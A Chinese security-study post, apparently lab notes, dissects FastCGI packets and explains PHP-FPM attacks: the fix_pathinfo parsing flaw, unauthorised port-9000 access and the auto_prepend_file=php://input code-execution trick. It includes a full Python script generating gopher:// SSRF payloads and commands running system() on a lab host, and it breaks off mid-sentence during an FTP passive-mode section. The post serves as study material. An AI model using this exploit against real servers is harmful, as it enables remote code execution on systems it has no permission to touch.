64 65 64 0e 01 43 4f 4e 54 45 rlencode d..CONTE00000070 4e 54 5f 4c 45 4e 47 54 48 33 0b 06 53 43 52 49 NT_LENGT H3..SCRI00000080 50 54 5f 4e 41 4d 45 2f 31 2e 70 68 70 0b 06 52 PT_NAME/ 1.php..R00000090 45 51 55 45 53 54 5f 55 52 49 2f 31 2e 70 68 70 EQUEST_U RI/1.php000000A0 0c 06 44 4f 43 55 4d 45 4e 54 5f 55 52 49 2f 31 ..DOCUME NT_URI/1000000B0 2e 70 68 70 0d 0d 44 4f 43 55 4d 45 4e 54 5f 52 .php..DO CUMENT_R000000C0 4f 4f 54 2f 76 61 72 2f 77 77 77 2f 68 74 6d 6c OOT/var/ www/html000000D0 0f 08 53 45 52 56 45 52 5f 50 52 4f 54 4f 43 4f ..SERVER _PROTOCO000000E0 4c 48 54 54 50 2f 31 2e 31 0e 04 52 45 51 55 45 LHTTP/1. 1..REQUE000000F0 53 54 5f 53 43 48 45 4d 45 68 74 74 70 11 07 47 ST_SCHEM Ehttp..G00000100 41 54 45 57 41 59 5f 49 4e 54 45 52 46 41 43 45 ATEWAY_I NTERFACE00000110 43 47 49 2f 31 2e 31 0f 0c 53 45 52 56 45 52 5f CGI/1.1. .SERVER_00000120 53 4f 46 54 57 41 52 45 6e 67 69 6e 78 2f 31 2e SOFTWARE nginx/1.00000130 32 30 2e 32 0b 0c 52 45 4d 4f 54 45 5f 41 44 44 20.2..RE MOTE_ADD00000140 52 31 39 32 2e 31 36 38 2e 32 30 2e 31 0b 05 52 R192.168 .20.1..R00000150 45 4d 4f 54 45 5f 50 4f 52 54 36 34 32 35 36 0b EMOTE_PO RT64256.00000160 0a 53 45 52 56 45 52 5f 41 44 44 52 31 37 32 2e .SERVER_ ADDR172.00000170 31 37 2e 30 2e 32 0b 02 53 45 52 56 45 52 5f 50 17.0.2.. SERVER_P00000180 4f 52 54 38 30 0b 09 53 45 52 56 45 52 5f 4e 41 ORT80..S ERVER_NA00000190 4d 45 6c 6f 63 61 6c 68 6f 73 74 0f 03 52 45 44 MElocalh ost..RED000001A0 49 52 45 43 54 5f 53 54 41 54 55 53 32 30 30 0f IRECT_ST ATUS200.000001B0 13 53 43 52 49 50 54 5f 46 49 4c 45 4e 41 4d 45 .SCRIPT_ FILENAME000001C0 2f 76 61 72 2f 77 77 77 2f 68 74 6d 6c 2f 31 2e /var/www /html/1.000001D0 70 68 70 09 0e 48 54 54 50 5f 48 4f 53 54 31 39 php..HTT P_HOST19000001E0 32 2e 31 36 38 2e 32 30 2e 31 32 39 0f 0a 48 54 2.168.20 .129..HT000001F0 54 50 5f 43 4f 4e 4e 45 43 54 49 4f 4e 6b 65 65 TP_CONNE CTIONkee00000200 70 2d 61 6c 69 76 65 13 01 48 54 54 50 5f 43 4f p-alive. .HTTP_CO00000210 4e 54 45 4e 54 5f 4c 45 4e 47 54 48 33 0b 08 48 NTENT_LE NGTH3..H00000220 54 54 50 5f 50 52 41 47 4d 41 6e 6f 2d 63 61 63 TTP_PRAG MAno-cac00000230 68 65 12 08 48 54 54 50 5f 43 41 43 48 45 5f 43 he..HTTP _CACHE_C00000240 4f 4e 54 52 4f 4c 6e 6f 2d 63 61 63 68 65 1e 01 ONTROLno -cache..00000250 48 54 54 50 5f 55 50 47 52 41 44 45 5f 49 4e 53 HTTP_UPG RADE_INS00000260 45 43 55 52 45 5f 52 45 51 55 45 53 54 53 31 0b ECURE_RE QUESTS1.00000270 15 48 54 54 50 5f 4f 52 49 47 49 4e 68 74 74 70 .HTTP_OR IGINhttp00000280 3a 2f 2f 31 39 32 2e 31 36 38 2e 32 30 2e 31 32 ://192.1 68.20.1200000290 39 11 21 48 54 54 50 5f 43 4f 4e 54 45 4e 54 5f 9.!HTTP_ CONTENT_000002A0 54 59 50 45 61 70 70 6c 69 63 61 74 69 6f 6e 2f TYPEappl ication/000002B0 78 2d 77 77 77 2d 66 6f 72 6d 2d 75 72 6c 65 6e x-www-fo rm-urlen000002C0 63 6f 64 65 64 0f 6f 48 54 54 50 5f 55 53 45 52 coded.oH TTP_USER000002D0 5f 41 47 45 4e 54 4d 6f 7a 69 6c 6c 61 2f 35 2e _AGENTMo zilla/5.000002E0 30 20 28 57 69 6e 64 6f 77 73 20 4e 54 20 31 30 0 (Windo ws NT 10000002F0 2e 30 3b 20 57 69 6e 36 34 3b 20 78 36 34 29 20 .0; Win6 4; x64) 00000300 41 70 70 6c 65 57 65 62 4b 69 74 2f 35 33 37 2e AppleWeb Kit/537.00000310 33 36 20 28 4b 48 54 4d 4c 2c 20 6c 69 6b 65 20 36 (KHTM L, like 00000320 47 65 63 6b 6f 29 20 43 68 72 6f 6d 65 2f 31 32 Gecko) C hrome/1200000330 38 2e 30 2e 30 2e 30 20 53 61 66 61 72 69 2f 35 8.0.0.0 Safari/500000340 33 37 2e 33 36 0b 80 00 00 87 48 54 54 50 5f 41 37.36... ..HTTP_A00000350 43 43 45 50 54 74 65 78 74 2f 68 74 6d 6c 2c 61 CCEPTtex t/html,a00000360 70 70 6c 69 63 61 74 69 6f 6e 2f 78 68 74 6d 6c pplicati on/xhtml00000370 2b 78 6d 6c 2c 61 70 70 6c 69 63 61 74 69 6f 6e +xml,app lication00000380 2f 78 6d 6c 3b 71 3d 30 2e 39 2c 69 6d 61 67 65 /xml;q=0 .9,image00000390 2f 61 76 69 66 2c 69 6d 61 67 65 2f 77 65 62 70 /avif,im age/webp000003A0 2c 69 6d 61 67 65 2f 61 70 6e 67 2c 2a 2f 2a 3b ,image/a png,*/*;000003B0 71 3d 30 2e 38 2c 61 70 70 6c 69 63 61 74 69 6f q=0.8,ap plicatio000003C0 6e 2f 73 69 67 6e 65 64 2d 65 78 63 68 61 6e 67 n/signed -exchang000003D0 65 3b 76 3d 62 33 3b 71 3d 30 2e 37 0c 1b 48 54 e;v=b3;q =0.7..HT000003E0 54 50 5f 52 45 46 45 52 45 52 68 74 74 70 3a 2f TP_REFER ERhttp:/000003F0 2f 31 39 32 2e 31 36 38 2e 32 30 2e 31 32 39 2f /192.168 .20.129/00000400 31 2e 70 68 70 14 0d 48 54 54 50 5f 41 43 43 45 1.php..H TTP_ACCE00000410 50 54 5f 45 4e 43 4f 44 49 4e 47 67 7a 69 70 2c PT_ENCOD INGgzip,00000420 20 64 65 66 6c 61 74 65 14 17 48 54 54 50 5f 41 deflate ..HTTP_A00000430 43 43 45 50 54 5f 4c 41 4e 47 55 41 47 45 7a 68 CCEPT_LA NGUAGEzh00000440 2d 43 4e 2c 7a 68 3b 71 3d 30 2e 39 2c 65 6e 3b -CN,zh;q =0.9,en;00000450 71 3d 30 2e 38 0b 80 00 00 fa 48 54 54 50 5f 43 q=0.8... ..HTTP_C00000460 4f 4f 4b 49 45 4a 53 45 53 53 49 4f 4e 49 44 3d OOKIEJSE SSIONID=00000470 41 38 44 35 46 42 34 45 45 42 45 41 43 37 34 44 A8D5FB4E EBEAC74D00000480 42 32 42 37 37 44 41 32 43 31 45 43 35 39 42 42 B2B77DA2 C1EC59BB00000490 3b 20 50 48 50 53 45 53 53 49 44 3d 32 68 63 74 ; PHPSES SID=2hct000004A0 70 62 69 63 63 37 66 68 39 32 37 30 6a 6b 62 75 pbicc7fh 9270jkbu000004B0 6b 63 61 63 62 61 3b 20 73 65 73 73 69 6f 6e 3d kcacba; session=000004C0 65 79 4a 6a 63 33 4a 6d 58 33 52 76 61 32 56 75 eyJjc3Jm X3Rva2Vu000004D0 49 6a 6f 69 4d 7a 45 34 4d 7a 64 69 59 6d 49 78 IjoiMzE4 MzdiYmIx000004E0 4e 32 5a 68 4e 6a 46 6d 4d 6a 6b 32 4f 47 45 33 N2ZhNjFm Mjk2OGE3000004F0 4e 44 51 30 59 7a 6b 78 4d 44 63 32 4e 6a 4a 6c NDQ0Yzkx MDc2NjJl00000500 59 57 59 30 4d 6a 5a 6d 5a 69 49 73 49 6d 6c 6b YWY0MjZm ZiIsImlk00000510 5a 57 35 30 61 58 52 35 49 6a 6f 69 5a 33 56 6c ZW50aXR5 IjoiZ3Vl00000520 63 33 51 69 4c 43 4a 31 63 32 56 79 62 6d 46 74 c3QiLCJ1 c2VybmFt00000530 5a 53 49 36 49 6d 68 6a 61 69 4a 39 2e 5a 74 32 ZSI6Imhj aiJ9.Zt200000540 56 72 41 2e 6d 68 52 5f 5a 67 72 42 35 57 54 50 VrA.mhR_ ZgrB5WTP00000550 37 31 47 45 71 7a 55 68 36 44 78 56 70 73 59 00 71GEqzUh 6DxVpsY.00000560 01 04 00 01 00 00 00 00 01 05 00 01 00 03 05 00 ........ ........00000570 78 3d 31 00 00 00 00 00 01 05 00 01 00 00 00 00 x=1..... ........ 在这个包里能看到许多PHP的SERVER全局变量的参数，把包拆分，第一个包为： 101 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00 其中前8位就是我们上面说的record头,它的意思即： version 为 01 type 为 01，表示这是第一个包 00 01 表示通信 ID 为 1 00 08 表示 body 大小为8 00 00 表示 padding 长度为 0，没有保留字节 后 8 位则是 body，它的意思是： 00 01 为 role，表示 PHP-FPM 接受我们的 HTTP 所关联的信息，并产生个响应role 的取值如下表： | role值 | 具体含义 || —— | ———————————————————— || 1 | 最常用的值，php-fpm接受我们的http所关联的信息，并产生个响应 || 2 | php-fpm会对我们的请求进行认证，认证通过的其会返回响应，认证不通过则关闭请求 || 3 | 过滤请求中的额外数据流，并产生过滤后的http响应 | 00 表示不 keep-alive，在处理完一次请求就关闭 五个 00 为保留字段 从数据包我们可以得知这第一个包进行了一些初始设置,再看第二个包: 101 04 00 01 05 47 01 00 0c 00 51 55 45 52 59 5f 01 为 version 04 说明在这个包中传递了环境参数 00 01 为通信 ID 05 47 说明 body 长度为 0x547，即 1351 01 00 表示 padding 长度为 1,有1字节的填充数据 Key Value QUERY_STRING (空字符串) REQUEST_METHOD POST CONTENT_TYPE application&#x2F;x-www-form-urlencoded CONTENT_LENGTH 3 SCRIPT_NAME &#x2F;1.php REQUEST_URI &#x2F;1.php DOCUMENT_URI &#x2F;1.php DOCUMENT_ROOT &#x2F;var&#x2F;www&#x2F;html SERVER_PROTOCOL HTTP&#x2F;1.1 REQUEST_SCHEME http GATEWAY_INTERFACE CGI&#x2F;1.1 SERVER_SOFTWARE nginx&#x2F;1.20.2 REMOTE_ADDR 192.168.20.1 REMOTE_PORT 64256 SERVER_ADDR 172.17.0.2 SERVER_PORT 80 SERVER_NAME localhost REDIRECT_STATUS 200 SCRIPT_FILENAME &#x2F;var&#x2F;www&#x2F;html&#x2F;1.php HTTP_HOST 192.168.20.129 HTTP_CONNECTION keep-alive HTTP_CONTENT_LENGTH 3 HTTP_PRAGMA no-cache HTTP_CACHE_CONTROL no-cache HTTP_UPGRADE_INSECURE_REQUESTS 1 HTTP_ORIGIN http://192.168.20.129 HTTP_CONTENT_TYPE application&#x2F;x-www-form-urlencoded HTTP_USER_AGENT Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;128.0.0.0 Safari&#x2F;537.36 HTTP_ACCEPT text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,&#x2F;;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7 HTTP_REFERER http://192.168.20.129/1.php HTTP_ACCEPT_ENCODING gzip, deflate HTTP_ACCEPT_LANGUAGE zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8 HTTP_COOKIE JSESSIONID&#x3D;A8D5FB4EEBEAC74DB2B77DA2C1EC59BB; PHPSESSID&#x3D;2hctpbicc7fh9270jkbukcacba; session&#x3D;eyJjc3JmX3Rva2VuIjoiMzE4MzdiYmIxN2ZhNjFmMjk2OGE3NDQ0YzkxMDc2NjJlYWY0MjZmZiIsImlkZW50aXR5IjoiZ3Vlc3QiLCJ1c2VybmFtZSI6ImhjaiJ9.Zt2VrA.mhR_ZgrB5WTP71GEqzUh6DxVpsY x 1 可以看到,type4中传递的这些key-value,和phpinfo中看到的那些一样 实际上,FPM是一个fastcgi协议解析器,Nginx等服务器中间件将用户请求按照fastcgi的规则打包好后通过TCP来将请求发送给FPM.FPM按照fastcgi协议将TCP流解析成真正的数据. type4发送的这些其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php。 然后再看看最后一个包: 1201 04 00 01 00 00 00 00 01 05 00 01 00 03 05 0078 3d 31 00 00 00 00 00 01 05 00 01 00 00 00 00 前面的应该是环境变量参数包的结尾,后面的是type&#x3D;5,POST提交数据的包头,下面是body和post包的结尾. 以上这就是一次Fastcgi请求的包了. Nginx（IIS7）解析漏洞Nginx和IIS7曾经出现过一个PHP相关的解析漏，该漏洞现象是，在用户访问http://127.0.0.1/favicon.ico/.php时，访问到的文件是favicon.ico，但却按照.php后缀解析。 当用户请求http://127.0.0.1/favicon.ico/.php时,nginx会发送如下环境变量到fpm里: 12345678&#123; ... &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/favicon.ico/.php&#x27;, &#x27;SCRIPT_NAME&#x27;: &#x27;/favicon.ico/.php&#x27;, &#x27;REQUEST_URI&#x27;: &#x27;/favicon.ico/.php&#x27;, &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;, ...&#125; 正常来说这里SCRIPT_FILENAME访问的是一个不存在的文件,但是PHP设置中有一个选项fix_pathinfo导致了 此漏洞.在这个选项被打开的情况下,fpm会判断SCRIPT_FILENAME是否存在,如果不存在则去掉去掉一个&#x2F;及以后的所有内容,并再次判断文件是否存在,循环类推. 也因此,在第一次访问&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico&#x2F;.php时发现不存在,再次查询&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico发现存在,于是被作为php文件执行,导致解析漏洞. 正确的解决方法有两种，一是在Nginx端使用fastcgi_split_path_info将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的security.limit_extensions配置项，避免其他后缀文件被解析。 PHP-FPM未授权访问漏洞​ 这个漏洞主要是因为php-fpm对两个进程间通讯没有进行安全性认证,php-fpm默认监听的是9000端口,如果这个端口暴露在公网上,我们就可以构造fastcgi协议来和fpm进行通信,通过构造数据包给环境变量赋值,最终可以达到任意文件执行的目的了. 但是由于在php5.3.9之后加入了fpm增加了security.limit_extensions选项 1234567; Limits the extensions of the main script FPM will allow to parse. This can; prevent configuration mistakes on the web server side. You should only limit; FPM to .php extensions to prevent malicious users to use other extensions to; exectute php code.; Note: set an empty value to allow all extensions.; Default Value: .php;security.limit_extensions = .php .php3 .php4 .php5 .php7 导致限制了只有这几种文件允许被fpm执行,默认是.php. 由于这个配置项的限制,如果想利用php-fpm的未授权访问漏洞,首先得先找到一个已存在的php文件，不过在安装php的时候，服务器上都会附带一些php后缀的文件，可以使用find / -name &quot;*.php”来搜索一下 可以看到有个老朋友&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php。 PHP-FPM任意代码执行​ 为什么我们前面说控制了fastcgi协议通信的内容，就可以可执行任意php代码呢？ 理论上确实不行，哪怕我们控制了SCRIPT_FILENAME，也是只能执行目标服务器上的文件，并不能任意代码执行。 不过php里面有两个配置项可以解决我们的需求，这两个配置项在学习文件包含中也很常见：auto_prepend_file和auto_append_file。 假如我们设置auto_prepend_file&#x3D;php:&#x2F;&#x2F;input,那么就等于在执行任何php文件前都要包含一遍POST中的内容,所以我们只需要把待执行的代码放在body中,就可以被执行成功了.(不过需要开启远程文件包含选项allow_url_include). 那么我们该如何设置auto_prepend_file的值呢? PHP-FPM中有两个环境变量,PHP_VALUE和PHP_ADMIN_VALUE.这两个环境变量就是用来设置php配置选项的,PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项,disable_function这个选项除外,这个是php加载的时候就确定的. 所以,我们需要最后传入如下环境变量: 123456789101112131415161718&#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;, &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;, &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;, &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;, &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;, &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27; &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;&#125; 设置auto_prepend_file &#x3D; php:&#x2F;&#x2F;input且allow_url_include &#x3D; On，然后将我们需要执行的代码放在Body中，即可执行任意代码。 使用P神的脚本python fpm.py 192.168.20.129 /var/www/html/index.php -c &quot;&lt;?php system(&#39;ls /&#39;); exit(); ?&gt;&quot; 完美拿下! 远程打PHP-FPM​ 现在我们已经可以通过PHP_VALUE 和 PHP_ADMIN_VALUE 这两个环境变量设置 PHP 配置选项 auto_prepend_file 和 allow_url_include ，从而使 PHP-FPM 执行我们提供的任意代码.如果PHP-FPM被绑定在公网上,那么任何人都可以伪装成中间件来让php-fpm任意代码执行. 也是使用P神的脚本即可,支持python2与3 SSRF打PHP-FPM使用p神脚本p神脚本是生成tcp流后直接发送,只需要把发送那部分注释掉即可,再把生成的tcp流前面加上gopher 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226#!/usr/bin/python# -*- coding:utf-8 -*-import socketimport randomimport argparseimport sysfrom io import BytesIOfrom six.moves.urllib import parse as urlparse# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;) else: s = str(s) return sclass FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False #return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b&#x27;&#x27; if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[&#x27;version&#x27;] = bord(stream[0]) header[&#x27;type&#x27;] = bord(stream[1]) header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#x27;paddingLength&#x27;] = bord(stream[6]) header[&#x27;reserved&#x27;] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[&#x27;content&#x27;] = b&#x27;&#x27; if &#x27;contentLength&#x27; in record.keys(): contentLength = int(record[&#x27;contentLength&#x27;]) record[&#x27;content&#x27;] += buffer.read(contentLength) if &#x27;paddingLength&#x27; in record.keys(): skiped = buffer.read(int(record[&#x27;paddingLength&#x27;])) return record def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;): if not self.__connect(): print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;) return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b&quot;&quot; beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b&#x27;&#x27; if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId) # 前面都是构造的tcp数据包,下面是发送,所以我们可以直接注释掉下面内容,然后返回request #self.sock.send(request) #self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND #self.requests[requestId][&#x27;response&#x27;] = &#x27;&#x27; #return self.__waitForResponse(requestId) return request def __waitForResponse(self, requestId): data = b&#x27;&#x27; while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[&#x27;requestId&#x27;]): self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;] if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#x27;response&#x27;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;) parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;) parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;) parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = &quot;/&quot; uri = args.file content = args.code params = &#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;), &#x27;SCRIPT_NAME&#x27;: uri, &#x27;QUERY_STRING&#x27;: &#x27;&#x27;, &#x27;REQUEST_URI&#x27;: uri, &#x27;DOCUMENT_ROOT&#x27;: documentRoot, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;, &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content), &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27; &#125; # 这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了 #response = client.request(params, content) #print(force_text(response)) request_ssrf = urlparse.quote(client.request(params, content)) print(&quot;gopher://127.0.0.1:&quot; + str(args.port) + &quot;/_&quot; + request_ssrf) 用法依旧: 1python fpm2.py -c &quot;&lt;?php system(&#x27;ls&#x27;); exit(); ?&gt;&quot; -p 9000 127.0.0.1 /var/www/html/index.php ​ 注:这里执行的命令的起始路径是我们传入的这个文件,例如/var/www/html/index.php这个 神了,从下午2点搭这个b环境打ssrf一直有问题,mb的最后发现是hcj的sb docker模板拉的是轻量级煞笔php,最后自己重新拉了个ubuntu配的php,nginx,php-fpm才好使,服了!!!!! 使用Gopherusgopherus确实牛逼,输入:python2 gopherus.py --exploit fastcgi后路径再输入已确定存在的php文件的路径,再输入要执行的命令即可. 效果: SSRF中的攻击点curl_exec()很经典的能进行ssrf的函数,能支持file,dict,gopher等伪协议. file_get_contents()可以从指定路径来获取资源,不支持gopher协议 sockopen()这个函数会使用socket跟服务器建立tcp连接，传输原始数据。 FTP攻击FPM&#x2F;FastCGIFTP的两种模式​ FTP会话包含了两个通道，控制通道和数据传输通道，FTP的工作有两种模式，一种是主动模式，一种是被动模式，以FTP Server为参照：主动模式，服务器主动连接客户端传输；被动模式，等待客户端的连接。 主动模式: ​ 在主动模式下，FTP客户端随机开启一个大于1024的端口N向服务器的21号端口发起连接，然后开放N+1号端口进行监听，并向服务器发出PORT N+1命令。服务器接收到命令后，会用其本地的FTP数据端口（通常是20）来连接客户端指定的端口N+1，进行数据传输。 被动模式: ​ 在被动模式下，FTP库户端随机开启一个大于1024的端口N向服务器的21号端口发起连接，同时会开启N+1号端口。然后向服务器发送PASV命令，通知服务器自己处于被动模式。服务器收到命令后，会开放一个大于1024的端口P进行监听，然后用PORT P命令通知客户端，自己的数据端口是P。客户端收到命令后，会通过N+1号端口连接服务器的端口P，然后在两个端口之间进行数据传输。 ​ 总的来说，主动模式的FTP是指服务器主动连接客户端的数据端口，被动模式的FTP是指服务器被动地等待客户端连接自己的数据端口。 ​ 由此可见,在被动模式中,FTP客户端和服务端的数据传输端口是由服务端指定的,实际上除了端口,服务器的地址也是可以被指定的.由于 FTP 和 HTTP 类似，协议内容全是纯文本，所以我们可以很清晰的看到它是如何指定地址和端口的： 1227 Entering Passive Mode(192,168,9,2,4,8) 227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语，而 (192,168,9,2,4,8) 代表让客户端到连接 192.168.9.2 的 4 * 256 